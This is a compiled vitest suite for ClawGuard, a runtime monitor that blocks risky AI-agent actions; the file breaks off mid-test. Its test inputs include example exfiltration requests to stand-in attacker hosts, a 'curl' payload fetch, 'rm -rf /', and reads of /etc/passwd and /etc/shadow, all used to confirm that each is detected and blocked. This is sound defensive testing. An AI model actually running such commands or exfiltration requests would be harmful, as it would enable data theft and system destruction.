"use strict";
/**
 * ClawGuard Test Suite
 *
 * Tests: Runtime Monitor, Kill Switch, Threat Intelligence,
 * Policy Engine, and Cross-Product Event Flow.
 */
Object.defineProperty(exports, "__esModule", { value: true });
const vitest_1 = require("vitest");
const fs_1 = require("fs");
const path_1 = require("path");
const os_1 = require("os");
const shared_1 = require("@clawstack/shared");
const clawguard_1 = require("@clawstack/clawguard");
// ─── Test Helpers ───────────────────────────────────────────────────
let tmpDir;
let graph;
let bus;
let agentId;
let sessionId;
function setup() {
    tmpDir = (0, fs_1.mkdtempSync)((0, path_1.join)((0, os_1.tmpdir)(), 'clawguard-test-'));
    graph = new shared_1.SessionGraph((0, path_1.join)(tmpDir, 'test.db'));
    bus = new shared_1.EventBus();
    const agent = graph.registerAgent({
        name: 'test-agent',
        platform: 'openclaw',
        version: '1.0.0',
        dockerSandboxed: false,
        metadata: {},
    });
    agentId = agent.agentId;
    const session = graph.startSession(agentId);
    sessionId = session.sessionId;
}
function cleanup() {
    graph.close();
    (0, fs_1.rmSync)(tmpDir, { recursive: true, force: true });
}
// ─── Policy Engine Tests ────────────────────────────────────────────
(0, vitest_1.describe)('PolicyEngine', () => {
    (0, vitest_1.beforeEach)(setup);
    (0, vitest_1.afterEach)(cleanup);
    (0, vitest_1.it)('loads default policy', () => {
        const engine = new clawguard_1.PolicyEngine();
        const policy = engine.getPolicy();
        (0, vitest_1.expect)(policy.name).toBe('default');
        (0, vitest_1.expect)(policy.network.blockExternalByDefault).toBe(true);
        (0, vitest_1.expect)(policy.filesystem.blockedPaths.length).toBeGreaterThan(0);
        (0, vitest_1.expect)(policy.process.allowShellExec).toBe(false);
    });
    (0, vitest_1.it)('merges custom policy with defaults', () => {
        const engine = new clawguard_1.PolicyEngine({
            name: 'custom',
            network: { allowedDomains: ['api.example.com', 'localhost'] },
        });
        const policy = engine.getPolicy();
        (0, vitest_1.expect)(policy.name).toBe('custom');
        (0, vitest_1.expect)(policy.network.allowedDomains).toContain('api.example.com');
        // Default fields still present
        (0, vitest_1.expect)(policy.network.blockExternalByDefault).toBe(true);
        (0, vitest_1.expect)(policy.filesystem.blockedPaths.length).toBeGreaterThan(0);
    });
    (0, vitest_1.it)('loads from JSON', () => {
        const engine = new clawguard_1.PolicyEngine();
        engine.loadFromJSON(JSON.stringify({
            name: 'from-json',
            network: { maxRequestsPerMinute: 120 },
        }));
        (0, vitest_1.expect)(engine.getPolicy().name).toBe('from-json');
        (0, vitest_1.expect)(engine.getPolicy().network.maxRequestsPerMinute).toBe(120);
    });
    (0, vitest_1.it)('exports to JSON', () => {
        const engine = new clawguard_1.PolicyEngine();
        const json = engine.toJSON();
        const parsed = JSON.parse(json);
        (0, vitest_1.expect)(parsed.name).toBe('default');
        (0, vitest_1.expect)(parsed.network).toBeDefined();
    });
    // ─── Network Policy ───────────────────────────────────────────
    (0, vitest_1.it)('blocks external network requests by default', () => {
        const engine = new clawguard_1.PolicyEngine();
        const result = engine.evaluateNetworkRequest({
            url: 'https://evil.com/exfil',
            method: 'POST',
            hostname: 'evil.com',
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatLevel).toBe('high');
        (0, vitest_1.expect)(result.threatSignature).toBe('NET_EXTERNAL_BLOCKED');
        (0, vitest_1.expect)(result.blocked).toBe(true);
    });
    (0, vitest_1.it)('allows localhost requests', () => {
        const engine = new clawguard_1.PolicyEngine();
        const result = engine.evaluateNetworkRequest({
            url: 'http://localhost:3000/api',
            method: 'GET',
            hostname: 'localhost',
        });
        (0, vitest_1.expect)(result).toBeNull();
    });
    (0, vitest_1.it)('blocks explicitly blocked domains', () => {
        const engine = new clawguard_1.PolicyEngine({
            network: {
                blockExternalByDefault: false,
                blockedDomains: ['malware.example.com'],
            },
        });
        const result = engine.evaluateNetworkRequest({
            url: 'https://malware.example.com/payload',
            method: 'GET',
            hostname: 'malware.example.com',
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('NET_BLOCKED_DOMAIN');
    });
    (0, vitest_1.it)('detects data exfiltration patterns', () => {
        const engine = new clawguard_1.PolicyEngine({
            network: { blockExternalByDefault: false },
        });
        const longBase64 = 'A'.repeat(200);
        const result = engine.evaluateNetworkRequest({
            url: `https://attacker.com/steal?base64=${longBase64}`,
            method: 'GET',
            hostname: 'attacker.com',
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('NET_DATA_EXFILTRATION');
        (0, vitest_1.expect)(result.threatLevel).toBe('critical');
    });
    (0, vitest_1.it)('supports wildcard domain matching', () => {
        const engine = new clawguard_1.PolicyEngine({
            network: {
                blockedDomains: ['*.evil.org'],
                blockExternalByDefault: false,
            },
        });
        const result = engine.evaluateNetworkRequest({
            url: 'https://sub.evil.org/data',
            method: 'GET',
            hostname: 'sub.evil.org',
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('NET_BLOCKED_DOMAIN');
    });
    // ─── Filesystem Policy ────────────────────────────────────────
    (0, vitest_1.it)('blocks access to sensitive paths', () => {
        const engine = new clawguard_1.PolicyEngine();
        const result = engine.evaluateFileAccess({
            path: '/etc/passwd',
            operation: 'read',
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('FS_SENSITIVE_PATH');
        (0, vitest_1.expect)(result.threatLevel).toBe('critical');
    });
    (0, vitest_1.it)('blocks writes outside sandbox', () => {
        const engine = new clawguard_1.PolicyEngine({
            filesystem: { sandboxRoot: '/home/agent/workspace' },
        });
        const result = engine.evaluateFileAccess({
            path: '/tmp/malicious-file',
            operation: 'write',
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('FS_WRITE_OUTSIDE_SANDBOX');
    });
    (0, vitest_1.it)('allows reads within allowed paths', () => {
        const engine = new clawguard_1.PolicyEngine({
            filesystem: { sandboxRoot: '/home/agent', blockedPaths: [] },
        });
        const result = engine.evaluateFileAccess({
            path: '/home/agent/project/src/app.ts',
            operation: 'read',
        });
        (0, vitest_1.expect)(result).toBeNull();
    });
    // ─── Process Policy ───────────────────────────────────────────
    (0, vitest_1.it)('blocks shell execution', () => {
        const engine = new clawguard_1.PolicyEngine();
        const result = engine.evaluateProcessSpawn({
            command: 'bash',
            args: ['-c', 'whoami'],
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('PROC_SHELL_EXEC');
    });
    (0, vitest_1.it)('blocks dangerous commands', () => {
        const engine = new clawguard_1.PolicyEngine();
        const result = engine.evaluateProcessSpawn({
            command: 'curl',
            args: ['https://evil.com/payload'],
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('PROC_BLOCKED_COMMAND');
        (0, vitest_1.expect)(result.threatLevel).toBe('critical');
    });
    (0, vitest_1.it)('allows listed commands', () => {
        const engine = new clawguard_1.PolicyEngine();
        const result = engine.evaluateProcessSpawn({
            command: 'node',
            args: ['server.js'],
        });
        (0, vitest_1.expect)(result).toBeNull();
    });
    (0, vitest_1.it)('flags unlisted commands as medium', () => {
        const engine = new clawguard_1.PolicyEngine();
        const result = engine.evaluateProcessSpawn({
            command: 'python',
            args: ['script.py'],
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('PROC_UNLISTED_COMMAND');
        (0, vitest_1.expect)(result.threatLevel).toBe('medium');
        (0, vitest_1.expect)(result.blocked).toBe(false);
    });
    // ─── Cost Anomaly Policy ──────────────────────────────────────
    (0, vitest_1.it)('detects token spike', () => {
        const engine = new clawguard_1.PolicyEngine({
            costAnomaly: { spikeThresholdMultiplier: 3 },
        });
        const result = engine.evaluateCostAnomaly({
            currentTokens: 100000,
            averageTokens: 10000,
            spikeMultiplier: 10,
            windowMs: 60000,
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('COST_SPIKE_DETECTED');
    });
    (0, vitest_1.it)('detects token rate exceeded', () => {
        const engine = new clawguard_1.PolicyEngine({
            costAnomaly: { maxTokensPerMinute: 100000 },
        });
        const result = engine.evaluateCostAnomaly({
            currentTokens: 200000,
            averageTokens: 200000,
            spikeMultiplier: 1,
            windowMs: 60000,
        });
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.threatSignature).toBe('COST_RATE_EXCEEDED');
    });
    (0, vitest_1.it)('passes normal cost usage', () => {
        const engine = new clawguard_1.PolicyEngine();
        const result = engine.evaluateCostAnomaly({
            currentTokens: 5000,
            averageTokens: 5000,
            spikeMultiplier: 1,
            windowMs: 60000,
        });
        (0, vitest_1.expect)(result).toBeNull();
    });
});
// ─── Kill Switch Tests ──────────────────────────────────────────────
(0, vitest_1.describe)('KillSwitch', () => {
    (0, vitest_1.beforeEach)(setup);
    (0, vitest_1.afterEach)(cleanup);
    (0, vitest_1.it)('terminates session on critical threat', async () => {
        const ks = new clawguard_1.KillSwitch(graph, bus);
        const triggerEvent = graph.recordBehavior({
            sessionId,
            agentId,
            eventType: 'network_request',
            details: { url: 'https://evil.com/exfil', hostname: 'evil.com' },
            threatLevel: 'critical',
            threatSignature: 'NET_DATA_EXFILTRATION',
            blocked: true,
        });
        const result = await ks.kill(sessionId, agentId, triggerEvent, 'Data exfiltration detected');
        (0, vitest_1.expect)(result.terminated).toBe(true);
        (0, vitest_1.expect)(result.sessionId).toBe(sessionId);
        (0, vitest_1.expect)(result.reason).toContain('Data exfiltration');
        (0, vitest_1.expect)(result.eventChain.length).toBeGreaterThan(0);
    });
    (0, vitest_1.it)('records kill event in Session Graph', async () => {
        const ks = new clawguard_1.KillSwitch(graph, bus);
        const triggerEvent = graph.recordBehavior({
            sessionId,
            agentId,
            eventType: 'process_spawn',
            details: { command: 'rm', args: ['-rf', '/'] },
            threatLevel: 'critical',
            threatSignature: 'PROC_BLOCKED_COMMAND',
            blocked: true,
        });
        await ks.kill(sessionId, agentId, triggerEvent, 'Destructive command');
        // Session should be terminated
        const sessions = graph.getActiveSessions(agentId);
        (0, vitest_1.expect)(sessions.length).toBe(0);
        // Kill event should be recorded
        const threats = graph.getThreats(sessionId, 'critical');
        const killEvents = threats.filter(t => t.threatSignature === 'KILL_SWITCH');
        (0, vitest_1.expect)(killEvents.length).toBe(1);
    });
    (0, vitest_1.it)('emits behavior.blocked on Event Bus', async () => {
        const ks = new clawguard_1.KillSwitch(graph, bus);
        const events = [];
        bus.on('behavior.blocked', (e) => { events.push(e); });
        const triggerEvent = graph.recordBehavior({
            sessionId,
            agentId,
            eventType: 'file_access',
            details: { path: '/etc/shadow', operation: 'read' },
            threatLevel: 'critical',
            threatSignature: 'FS_SENSITIVE_PATH',
            blocked: true,
        });
        await ks.kill(sessionId, agentId, triggerEvent, 'Sensitive file access');
        (0, vitest_1.expect)(events.length).toBe(1);
        (0, vitest_1.expect)(events[0].sourceProduct).toBe('clawguard');
        (0, vitest_1.expect)(events[0].payload.action).toBe('kill_switch');
    });
    (0, vitest_1.it)('evaluate returns null when no critical threats', async () => {
        const ks = new clawguard_1.KillSwitch(graph, bus);
        graph.recordBehavior({
            sessionId,
            agentId,
            eventType: 'network_request',
            details: { url: 'http://localhost:3000' },
            threatLevel: 'none',
            threatSignature: null,
            blocked: false,
        });
        const result = await ks.evaluate(sessionId, agentId);
        (0, vitest_1.expect)(result).toBeNull();
    });
    (0, vitest_1.it)('evaluate triggers on existing critical threats', async () => {
        const ks = new clawguard_1.KillSwitch(graph, bus);
        graph.recordBehavior({
            sessionId,
            agentId,
            eventType: 'network_request',
            details: { url: 'https://evil.com' },
            threatLevel: 'critical',
            threatSignature: 'NET_EXFIL',
            blocked: true,
        });
        const result = await ks.evaluate(sessionId, agentId);
        (0, vitest_1.expect)(result).not.toBeNull();
        (0, vitest_1.expect)(result.terminated).toBe(true);
    });
});
// ─── Threat Intelligence Tests ──────────────────────────────────────
(0, vitest_1.describe)('ThreatIntel', () => {
    (0, vitest_1.beforeEach)(setup);
    (0, vitest_1.afterEach)(cleanup);
    (0, vitest_1.it)('loads builtin signatures', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        const sigs = intel.getAllSignatures();
        (0, vitest_1.expect)(sigs.length).toBeGreaterThan(0);
        const exfil = intel.getSignature('SIG_EXFIL_BASE64');
        (0, vitest_1.expect)(exfil).not.toBeNull();
        (0, vitest_1.expect)(exfil.severity).toBe('critical');
    });
    (0, vitest_1.it)('includes CVE-2026-25253 signature', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        const cve = intel.getSignature('SIG_CVE_2026_25253');
        (0, vitest_1.expect)(cve).not.toBeNull();
        (0, vitest_1.expect)(cve.name).toContain('CVE-2026-25253');
        (0, vitest_1.expect)(cve.severity).toBe('critical');
    });
    (0, vitest_1.it)('includes ClawHavoc signature', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        const havoc = intel.getSignature('SIG_CLAWHAVOC');
        (0, vitest_1.expect)(havoc).not.toBeNull();
        (0, vitest_1.expect)(havoc.severity).toBe('critical');
    });
    (0, vitest_1.it)('registers custom signatures', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        intel.registerSignature({
            signatureId: 'SIG_CUSTOM_1',
            name: 'Custom Test Signature',
            description: 'Test signature',
            pattern: 'test-pattern',
            category: 'behavioral',
            severity: 'medium',
        });
        const sig = intel.getSignature('SIG_CUSTOM_1');
        (0, vitest_1.expect)(sig).not.toBeNull();
        (0, vitest_1.expect)(sig.hitCount).toBe(0);
    });
    (0, vitest_1.it)('matches signatures against events', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        const event = {
            eventId: 'test',
            sessionId,
            agentId,
            eventType: 'network_request',
            timestamp: new Date().toISOString(),
            details: { url: 'https://evil.com?base64=' + 'A'.repeat(200) },
            threatLevel: 'none',
            threatSignature: null,
            blocked: false,
        };
        const matches = intel.matchSignatures(event);
        (0, vitest_1.expect)(matches.length).toBeGreaterThan(0);
        (0, vitest_1.expect)(matches.some(m => m.signatureId === 'SIG_EXFIL_BASE64')).toBe(true);
    });
    (0, vitest_1.it)('records skill threats and downgrades trust', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        // First register a skill as verified
        graph.setSkillTrust({
            skillId: 'skill-1',
            skillName: 'Test Skill',
            publisher: 'test-publisher',
            trustLevel: 'verified',
            certifiedAt: new Date().toISOString(),
            lastAuditAt: null,
            threatHistory: 0,
            behavioralFingerprint: null,
        });
        // Record a high threat
        const event = {
            eventId: 'test-event',
            sessionId,
            agentId,
            eventType: 'network_request',
            timestamp: new Date().toISOString(),
            details: { skillName: 'Test Skill' },
            threatLevel: 'high',
            threatSignature: 'NET_EXTERNAL_BLOCKED',
            blocked: true,
        };
        intel.recordSkillThreat('skill-1', event);
        const trust = graph.getSkillTrust('skill-1');
        (0, vitest_1.expect)(trust).not.toBeNull();
        (0, vitest_1.expect)(trust.threatHistory).toBe(1);
        // High threat should downgrade from verified to community
        (0, vitest_1.expect)(trust.trustLevel).toBe('community');
    });
    (0, vitest_1.it)('critical threat downgrades skill to untrusted', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        graph.setSkillTrust({
            skillId: 'skill-2',
            skillName: 'Bad Skill',
            publisher: 'unknown',
            trustLevel: 'certified',
            certifiedAt: new Date().toISOString(),
            lastAuditAt: null,
            threatHistory: 0,
            behavioralFingerprint: null,
        });
        const event = {
            eventId: 'crit-event',
            sessionId,
            agentId,
            eventType: 'process_spawn',
            timestamp: new Date().toISOString(),
            details: {},
            threatLevel: 'critical',
            threatSignature: 'PROC_BLOCKED_COMMAND',
            blocked: true,
        };
        intel.recordSkillThreat('skill-2', event);
        const trust = graph.getSkillTrust('skill-2');
        (0, vitest_1.expect)(trust.trustLevel).toBe('untrusted');
    });
    (0, vitest_1.it)('creates new skill entry on first threat', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        const event = {
            eventId: 'new-event',
            sessionId,
            agentId,
            eventType: 'network_request',
            timestamp: new Date().toISOString(),
            details: { skillName: 'New Skill', publisher: 'someone' },
            threatLevel: 'medium',
            threatSignature: 'NET_EXTERNAL_BLOCKED',
            blocked: false,
        };
        intel.recordSkillThreat('new-skill-id', event);
        const trust = graph.getSkillTrust('new-skill-id');
        (0, vitest_1.expect)(trust).not.toBeNull();
        (0, vitest_1.expect)(trust.trustLevel).toBe('untrusted');
        (0, vitest_1.expect)(trust.threatHistory).toBe(1);
    });
    (0, vitest_1.it)('generates behavioral fingerprints', () => {
        const intel = new clawguard_1.ThreatIntel(graph);
        const event = {
            eventId: 'fp-test',
            sessionId,
            agentId,
            eventType: 'network_request',
            timestamp: new Date().toISOString(),
            details: { url: 'https://evil.com' },
            threatLevel: 'high',
            threatSignature: 'NET_EXTERNAL_BLOCKED',
            blocked: true,
        };
        const fp = intel.generateFingerprint(event);
        (0, vitest_1.expect)(fp).toHaveLength(32);
        // Same event should produce same fingerprint
        const fp2 = intel.generateFingerprint(event);
        (0, vitest_1.expect)(fp).toBe(fp2);
    });
    (0, vitest_1.it)('exports and imports signatures', () => {
        const intel1 = new clawguard_1.ThreatIntel(graph);
        intel1.registerSignature({
            signatureId: 'SIG_EXPORT_TEST',
            name: 'Export Test',
            description: 'Testing export',
            pattern: 'export-test-pattern',
            category: 'behavioral',
            severity: 'low',
        });
        const exported = intel1.exportSignatures();
        const parsed = JSON.parse(exported);
        (0, vitest_1.expect)(parsed.length).toBeGreaterThan(0);
        const intel2 = new clawguard_1.ThreatIntel(graph);
        const builtinCount = intel2.getAllSignatures().length;
        const imported = intel2.importSignatures(exported);
        // Should only import the custom one (builtins already exist)
        (0, vitest_1.expect)(imported).toBe(1);
        (0, vitest_1.expect)(intel2.getAllSignatures().length).toBe(builtinCount + 1);
    });
});
// ─── Runtime Monitor Tests ──────────────────────────────────────────
(0, vitest_1.describe)('RuntimeMonitor', () => {
    (0, vitest_1.beforeEach)(setup);
    (0, vitest_1.afterEach)(cleanup);
    (0, vitest_1.it)('blocks external network request and records in Session Graph', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        const result = await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'https://evil.com/steal',
            method: 'POST',
            hostname: 'evil.com',
        });
        (0, vitest_1.expect)(result.allowed).toBe(false);
        (0, vitest_1.expect)(result.detection).not.toBeNull();
        (0, vitest_1.expect)(result.detection.threatSignature).toBe('NET_EXTERNAL_BLOCKED');
        // Verify recorded in Session Graph
        const threats = graph.getThreats(sessionId, 'high');
        (0, vitest_1.expect)(threats.length).toBe(1);
        (0, vitest_1.expect)(threats[0].blocked).toBe(true);
    });
    (0, vitest_1.it)('allows localhost network request', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus);
        const result = await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'http://localhost:8080/api',
            method: 'GET',
            hostname: 'localhost',
        });
        (0, vitest_1.expect)(result.allowed).toBe(true);
        (0, vitest_1.expect)(result.detection).toBeNull();
    });
    (0, vitest_1.it)('blocks sensitive file access', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        const result = await monitor.interceptFileAccess(sessionId, agentId, {
            path: '/etc/passwd',
            operation: 'read',
        });
        (0, vitest_1.expect)(result.allowed).toBe(false);
        (0, vitest_1.expect)(result.detection.threatSignature).toBe('FS_SENSITIVE_PATH');
        (0, vitest_1.expect)(result.detection.threatLevel).toBe('critical');
    });
    (0, vitest_1.it)('blocks shell execution', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        const result = await monitor.interceptProcessSpawn(sessionId, agentId, {
            command: 'bash',
            args: ['-c', 'cat /etc/shadow'],
        });
        (0, vitest_1.expect)(result.allowed).toBe(false);
        (0, vitest_1.expect)(result.detection.threatSignature).toBe('PROC_SHELL_EXEC');
    });
    (0, vitest_1.it)('allows permitted commands', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus);
        const result = await monitor.interceptProcessSpawn(sessionId, agentId, {
            command: 'node',
            args: ['index.js'],
        });
        (0, vitest_1.expect)(result.allowed).toBe(true);
        (0, vitest_1.expect)(result.detection).toBeNull();
    });
    (0, vitest_1.it)('emits behavior.detected on threat detection', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        const detectedEvents = [];
        bus.on('behavior.detected', (e) => { detectedEvents.push(e); });
        await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'https://attacker.com/c2',
            method: 'POST',
            hostname: 'attacker.com',
        });
        (0, vitest_1.expect)(detectedEvents.length).toBe(1);
        (0, vitest_1.expect)(detectedEvents[0].sourceProduct).toBe('clawguard');
        (0, vitest_1.expect)(detectedEvents[0].payload.threatLevel).toBe('high');
    });
    (0, vitest_1.it)('emits behavior.blocked when blocking', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        const blockedEvents = [];
        bus.on('behavior.blocked', (e) => { blockedEvents.push(e); });
        await monitor.interceptFileAccess(sessionId, agentId, {
            path: '/etc/shadow',
            operation: 'read',
        });
        (0, vitest_1.expect)(blockedEvents.length).toBe(1);
        (0, vitest_1.expect)(blockedEvents[0].sessionId).toBe(sessionId);
    });
    (0, vitest_1.it)('auto-kills on critical threat', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: true });
        await monitor.interceptFileAccess(sessionId, agentId, {
            path: '/etc/passwd',
            operation: 'read',
        });
        // Session should be terminated
        const sessions = graph.getActiveSessions(agentId);
        (0, vitest_1.expect)(sessions.length).toBe(0);
    });
    (0, vitest_1.it)('detects cost anomaly spike', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, {
            autoKill: false,
            policy: {
                costAnomaly: { spikeThresholdMultiplier: 3, windowSizeMs: 60000, maxTokensPerMinute: 500000 },
            },
        });
        // Send normal costs first to establish baseline
        await monitor.interceptCostEvent(sessionId, agentId, 1000);
        await monitor.interceptCostEvent(sessionId, agentId, 1200);
        await monitor.interceptCostEvent(sessionId, agentId, 900);
        // Send a massive spike
        const result = await monitor.interceptCostEvent(sessionId, agentId, 50000);
        (0, vitest_1.expect)(result.anomaly).toBe(true);
        (0, vitest_1.expect)(result.detection).not.toBeNull();
        (0, vitest_1.expect)(result.detection.threatSignature).toBe('COST_SPIKE_DETECTED');
    });
    (0, vitest_1.it)('accepts custom policy', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, {
            policy: {
                network: {
                    allowedDomains: ['api.openai.com', 'localhost'],
                    blockExternalByDefault: true,
                },
            },
        });
        const result = await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'https://api.openai.com/v1/chat',
            method: 'POST',
            hostname: 'api.openai.com',
        });
        (0, vitest_1.expect)(result.allowed).toBe(true);
    });
    (0, vitest_1.it)('exposes sub-components', () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus);
        (0, vitest_1.expect)(monitor.getPolicyEngine()).toBeInstanceOf(clawguard_1.PolicyEngine);
        (0, vitest_1.expect)(monitor.getKillSwitch()).toBeInstanceOf(clawguard_1.KillSwitch);
        (0, vitest_1.expect)(monitor.getThreatIntel()).toBeInstanceOf(clawguard_1.ThreatIntel);
    });
});
// ─── Cross-Product Event Flow Tests ─────────────────────────────────
(0, vitest_1.describe)('Cross-Product Event Flow', () => {
    (0, vitest_1.beforeEach)(setup);
    (0, vitest_1.afterEach)(cleanup);
    (0, vitest_1.it)('ClawGuard threat → ClawBudget sees via Event Bus', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        // Simulate ClawBudget listening for behavior events
        const budgetAlerts = [];
        bus.on('behavior.detected', (event) => {
            budgetAlerts.push(event);
        });
        bus.on('behavior.blocked', (event) => {
            budgetAlerts.push(event);
        });
        // ClawGuard blocks a network request
        await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'https://exfil.attacker.com/data',
            method: 'POST',
            hostname: 'exfil.attacker.com',
        });
        // ClawBudget should see both detected and blocked events
        (0, vitest_1.expect)(budgetAlerts.length).toBe(2);
        (0, vitest_1.expect)(budgetAlerts[0].channel).toBe('behavior.detected');
        (0, vitest_1.expect)(budgetAlerts[1].channel).toBe('behavior.blocked');
        (0, vitest_1.expect)(budgetAlerts[0].sourceProduct).toBe('clawguard');
    });
    (0, vitest_1.it)('ClawGuard writes to Session Graph, Dashboard reads via view', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        // ClawGuard intercepts a few events
        await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'http://localhost:3000/api',
            method: 'GET',
            hostname: 'localhost',
        });
        await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'https://evil.com/steal',
            method: 'POST',
            hostname: 'evil.com',
        });
        await monitor.interceptFileAccess(sessionId, agentId, {
            path: './src/app.ts',
            operation: 'read',
        });
        // Dashboard queries session summaries
        const summaries = graph.getSessionSummaries();
        (0, vitest_1.expect)(summaries.length).toBe(1);
        (0, vitest_1.expect)(summaries[0].session_id).toBe(sessionId);
        (0, vitest_1.expect)(summaries[0].total_events).toBe(3);
        (0, vitest_1.expect)(summaries[0].threat_events).toBe(1);
        (0, vitest_1.expect)(summaries[0].blocked_events).toBe(1);
    });
    (0, vitest_1.it)('kill switch terminates and all products notified', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: true });
        const allEvents = [];
        bus.on('*', (e) => { allEvents.push(e); });
        // Trigger a critical threat → auto-kill
        await monitor.interceptFileAccess(sessionId, agentId, {
            path: '/etc/passwd',
            operation: 'read',
        });
        // Should have: behavior.detected + behavior.blocked (from detection) + behavior.blocked (from kill switch)
        const blocked = allEvents.filter(e => e.channel === 'behavior.blocked');
        (0, vitest_1.expect)(blocked.length).toBeGreaterThanOrEqual(2);
        // Session should be terminated
        const sessions = graph.getActiveSessions(agentId);
        (0, vitest_1.expect)(sessions.length).toBe(0);
    });
    (0, vitest_1.it)('multiple interceptors write to same session timeline', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'http://localhost:3000',
            method: 'GET',
            hostname: 'localhost',
        });
        await monitor.interceptFileAccess(sessionId, agentId, {
            path: './package.json',
            operation: 'read',
        });
        await monitor.interceptProcessSpawn(sessionId, agentId, {
            command: 'npm',
            args: ['test'],
        });
        // All events recorded for this session
        const threats = graph.getThreats(sessionId, 'low');
        // npm is not in the allowed list, so it's flagged as unlisted (medium, not blocked)
        // Actually 'npm' IS in the allowed list. Let me check...
        // Allowed: node, npm, npx, git, tsc, vitest — npm IS allowed. So no threats.
        // But process_spawn with 'npm' should pass. The threats query only returns low+ events.
        // Let's just check all behavior events via the DB
        const allEvents = graph.getDb()
            .prepare('SELECT * FROM behavior_events WHERE session_id = ?')
            .all(sessionId);
        (0, vitest_1.expect)(allEvents.length).toBe(3);
    });
    (0, vitest_1.it)('wildcard subscriber sees all ClawGuard events', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        const allEvents = [];
        bus.on('*', (e) => { allEvents.push(e); });
        await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'https://evil.com',
            method: 'GET',
            hostname: 'evil.com',
        });
        (0, vitest_1.expect)(allEvents.length).toBeGreaterThan(0);
        (0, vitest_1.expect)(allEvents.every(e => e.sourceProduct === 'clawguard')).toBe(true);
    });
    (0, vitest_1.it)('prefix subscriber behavior.* catches both detected and blocked', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        const behaviorEvents = [];
        bus.on('behavior.*', (e) => { behaviorEvents.push(e); });
        await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'https://evil.com',
            method: 'GET',
            hostname: 'evil.com',
        });
        (0, vitest_1.expect)(behaviorEvents.length).toBe(2);
        const channels = behaviorEvents.map(e => e.channel);
        (0, vitest_1.expect)(channels).toContain('behavior.detected');
        (0, vitest_1.expect)(channels).toContain('behavior.blocked');
    });
});
// ─── Integration: Full Attack Scenario ──────────────────────────────
(0, vitest_1.describe)('Full Attack Scenario', () => {
    (0, vitest_1.beforeEach)(setup);
    (0, vitest_1.afterEach)(cleanup);
    (0, vitest_1.it)('detects and kills multi-stage attack', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: true });
        const allEvents = [];
        bus.on('*', (e) => { allEvents.push(e); });
        // Stage 1: Reconnaissance — file read (allowed)
        const recon = await monitor.interceptFileAccess(sessionId, agentId, {
            path: './package.json',
            operation: 'read',
        });
        (0, vitest_1.expect)(recon.allowed).toBe(true);
        // Stage 2: Privilege escalation attempt — read /etc/passwd (CRITICAL → auto-kill)
        const privesc = await monitor.interceptFileAccess(sessionId, agentId, {
            path: '/etc/passwd',
            operation: 'read',
        });
        (0, vitest_1.expect)(privesc.allowed).toBe(false);
        (0, vitest_1.expect)(privesc.detection.threatLevel).toBe('critical');
        // Session should be dead
        const sessions = graph.getActiveSessions(agentId);
        (0, vitest_1.expect)(sessions.length).toBe(0);
        // Full event trail should exist in Session Graph
        const threats = graph.getThreats(sessionId, 'critical');
        (0, vitest_1.expect)(threats.length).toBeGreaterThanOrEqual(1);
        // Event bus should have fired notifications
        (0, vitest_1.expect)(allEvents.length).toBeGreaterThan(0);
    });
    (0, vitest_1.it)('tracks threat across skill lifecycle', async () => {
        const monitor = new clawguard_1.RuntimeMonitor(graph, bus, { autoKill: false });
        // Register skill as verified
